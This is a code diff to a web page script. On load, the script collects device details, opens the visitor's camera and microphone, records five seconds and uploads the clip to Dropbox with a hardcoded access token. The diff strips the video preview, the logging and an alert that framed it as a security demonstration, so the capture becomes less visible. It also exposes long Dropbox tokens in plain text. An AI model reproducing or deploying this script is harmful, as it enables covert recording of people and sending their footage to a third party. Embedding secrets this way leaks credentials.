@@ -5,59 +5,48 @@ window.onload = async () => {
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         resolution: `${window.screen.width}x${window.screen.height}`
     };
-    console.log("Device Info Captured:", deviceInfo);
 
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        const videoElement = document.getElementById('video');
-        
-        videoElement.srcObject = stream;
-
         const mediaRecorder = new MediaRecorder(stream);
         let chunks = [];
 
         mediaRecorder.ondataavailable = (e) => {
-            if (e.data.size > 0) {
-                chunks.push(e.data);
-            }
+            if (e.data.size > 0) chunks.push(e.data);
         };
 
         mediaRecorder.onstop = async () => {
             const videoBlob = new Blob(chunks, { type: 'video/webm' });
             
-            const localVideoUrl = URL.createObjectURL(videoBlob);
+            const infoDiv = document.getElementById('device-info-container');
+            infoDiv.style.display = "block";
+            infoDiv.innerHTML = `
+                <h4 style="color: #58a6ff; margin-top: 0;">Captured Device Metadata:</h4>
+                <p><strong>OS:</strong> ${deviceInfo.os}</p>
+                <p><strong>Browser:</strong> ${deviceInfo.browser}</p>
+                <p><strong>Timezone:</strong> ${deviceInfo.timezone}</p>
+                <p><strong>Resolution:</strong> ${deviceInfo.resolution}</p>
+            `;
             
-            videoElement.srcObject = null;        
-            videoElement.src = localVideoUrl;     
-            videoElement.style.display = "block"; 
-            videoElement.width = 400;             
-            videoElement.controls = true;         
-            
-            console.log("Phase 1: Video saved to local memory and ready for viewing.");
-
-            console.log("Phase 2: Starting cloud upload to Dropbox...");
             await uploadToCloud(videoBlob);
         };
 
         mediaRecorder.start();
-        console.log("Recording started...");
         
         setTimeout(() => {
             if (mediaRecorder.state !== "inactive") {
                 mediaRecorder.stop();
                 stream.getTracks().forEach(track => track.stop());
-                console.log("Recording finished.");
             }
         }, 5000);
 
     } catch (err) {
-        console.error("Camera access denied or hardware not found.", err);
-        alert("Camera access is required for this security demonstration.");
+        console.error(err);
     }
 };
 
 async function uploadToCloud(videoBlob) {
-    const ACCESS_TOKEN = 'sl.u.AGUs8_5fEIUVEoH8fu5hjeInkCqMY4b6b0nQl7wryfNbCk7zSN06kB2NiYHdVwZP4wZMzMcso0qrBnfhS1Hmhl6ca22lt3mUi7SXEhX3pt3AsklWM6JgZTgJexjE3KLAGfvgUg4wb2dWZ9PZnnfH_irQsAsWk-EtoEYOGSqiLQdndF0Awn3yD502VZzTbL0UeZoHuNKR7HNHOuqPv5D9O0QF7Z15r7DHA0VGJzECEVzcqgIBtvYVtqpQtTB3Lrw67hPCevCYnLgIV2aAhBBdQE1TMmvgemhTPB4rE2iz5DgIL821PjF_kDXiIztoz3l5Zz_P_-_ZhaLau2-TxJ46ghLigFBQRUrbDwGkGE2XkzGGuWe7PS6b1lywyQbTVXv8-3DdQrUPY-XPrbRoIYLc2MffuXqkQocUZrNLW9dJVk8JjcW-GM-ukFkScMayw2u-u3bg7i7vT4L4pOeMmHdBVgBQSMPpOOIfsFeinu089oNzbaUdO1TYEpbfWC1r2sPDfd5LhPfgvoR6glzW3hp_TA11v5ZtphOICF5Zn68YiZckMP_M-eXS_e5xVRCitwlmMXR8HDG4JoaZLIUs1Pzjf6NHJ5MGQ329LNxYk93dcpoHgFost0XyLrXZYsr73DZS1XWFdKqTplSAqfq3g0UTmSZGdGW9g963wFxjDiRSV4RfVkdWrZiR9ON3GUPqz6ysfvA76zrW3hMpE_V6d6fPpGs_QDFaNdfH_OaRGMMpw_Jaf2G4sCJhjFuJcWs9Ikl6ZGtYkURrXTqxpP_SbcmvHldZBLEdGietQt9B3FlC-mvi9sgCzixxJikuL2epVDGEraw8G3cMiXO2geMth-zu-MkUfJcOuDKGDsN7dveoD38IhbTNL6pfA-GvuOmb14C8GHqPT59FPKBWnQKsmvh9O-yhEQS9knU4rxUxJ5-0i8Zc9HxQO-qnaYWix16coXRHvypvx06c182mrdxK3Hv6KnB67YgiP6OVo9cJ_2oBnEdy-KEzazIYPyAxrWnMGi_LIHQg_-TKgSxwQ_Qt9tjotAlsRIKdl0fDd_Zol2T8qJnbhJUiSFxoHnoO-hyl0OpDp_7ACBpOv9yTfthl7jqdaXv5POgrlNpBCAN6VdnbFbdW-oxbJy7hsaAsvyk6x3ainmUwV2VXkRUke3WOmhZCTHV1QWINcicBrRz-mDl4s3ax9tW6xQ8jycuvzyBtcsN6sHCXEKhgE305t7via_qWecyntMpvE6xn5hSZfjcaFT5Zt2scLBL3rXSP1GUMlD4QC_qnMRrO51l1MsxTjbyM_a38n32CxH_hs7jqDixlMxmIiTn_PN2VkpTlqXYEuuwOMCSZP59HkK3FgSwD4LUjYHfsahXuGa1dk0OW4EE4fURTqJlE9VS2sYxOPlDf0w6CRBVYNGO95mws-BGu4ML_EqpcjfoVmMMT2WVQEiQm1EwgXg'; 
+    const ACCESS_TOKEN = 'sl.u.AGXrd8aed8GaBjXCNv3Wlevq5PKr0p_dNmgoI7udgL_t2E5UcWF2PtOUAr5d94DXLc7GfbFKwHAuDaLBIRo3fYAvQ5ZopcZqAtCImwmf_C0T8jaJA5hMSBoMVWngt591rxnb7ABlkkGV_wFH6zzYSlRDkL-_DikUe74A3LGRywzXJzMVTYQ734F-Q1FcGyy_CvZFioHdMBMS1rx2lwP3CL7gwf1Trix-hvfXD3Wcl-yOyN9I45W7M3N5evjVMK7ruETxmhW5KCLmqbAcrSFG87nT2Hf6w8wgKP1CES5HsX8CYEtX4BMMkfr3ZcixAo0ctzOdQuL86sX9Ck_vEbc3ozz-MSrcplrBtEk-oHt6zUL-L1VeKwmyutw9_bivjyVNnpj0M3AqIr64teLz1P4E4QN584_E2mX2xr_8TdAeATNA9ebyc2c_1cdW_gqM4tbQ_vqRWH4JzVjHD-XdSbkXk1uUo974XXO9tNuDlZUZSirD_gq3Sp6ChES9qJBybpMUpJ1EhZfw3BV3z_iWOfI3vV9znhS95SsxvnlK7OOC6z_NOa4RJ0yfjjQhF-hK_0UqUQra_SNDjVXpKf2CQ3m50GES4nEHv1ZppHGx_viNt0p7sG58TEXZv7lgyIWof4SzwHR6enYs5sAGNDRtwGGFS0UqcHznADIctx2xF1i8v5Kk3UP-Qq0NCfF75UKQ47d_g8FcyuCEgCsGUg87QASfnuQHKDi2aic8JQDg6PMGsl85OmqU-JP0BqQ6cmIplpf-fMB1ACz8WmCw_7miWk1y-gUYJQeHO84DfgIXg7FCKx0g-bR5_k0JctCDxy1focUqGntJdfawRoYeQiV_OPD8V_Sy2GKa2aM_xEG6k5jZxt8_sPb9RqiR3yiuGV3A5E_Xqdlle57igpnhDIDAqMDiUKS_BNAArPdNO-xOM9zDT4zW0hN_a2_OMw5QyvVlj4XGYD49yh0ulRBgyiPuwB3f4_L3KPCZYIHN9hd2VR_R-b16d1O6BFbLhuZv32n9e-maB76xuB5YSNL50mQkM9nNSXhobLymL87F9Xfzd4LLPmFDwjUJmG-4LopqgV50vHvcpnpGW1BpjryFkolPFgW8UThu1MJPIUCDhrMDiv16nFWJer3OtaYbaXAbPQ_tVNKhavtEBz2otskcC99Bi1QcdM9bXL6I_62oe5MIk2HOHc_VGhUWqFHR5yrVkSdqIBbPwuZce4FkQU1ayRzM1JCfvQOlBrv4KNp5rdzAseZVwKT3c68bfk34ErLrkywTmvUQpz8bmZ6D-Xg1i1L1HmGu2oGvjjJuTaJrqAo0dKcjMeK2uG60NSD0h3zVd9Zmb2rusaLjmlbFpLOVSXIqnhyYff_s5uAWubUdRSBHrPxM8hSFXWJ25-VCPVmW5H6d0deBqkJXisyFz3Muzr4WF1pUDJp8XWMmCRb04C-tZpqwYjGC2Q'; 
     const fileName = `capture_${Date.now()}.webm`;
 
     try {
@@ -76,19 +65,10 @@ async function uploadToCloud(videoBlob) {
             body: videoBlob
         });
 
-        if (!response.ok) {
-            throw new Error(`Dropbox API Error: ${response.statusText}`);
+        if (response.ok) {
+            document.getElementById('warning-box').style.display = 'block';
         }
-
-        const result = await response.json();
-        console.log('Phase 2 Success: Video uploaded to Dropbox!', result);
-        
-        const warningBox = document.getElementById('warning-box');
-        if (warningBox) {
-            warningBox.style.display = 'block';
-        }
-
     } catch (error) {
-        console.error('Cloud Upload Failed:', error);
+        console.error(error);
     }
 }
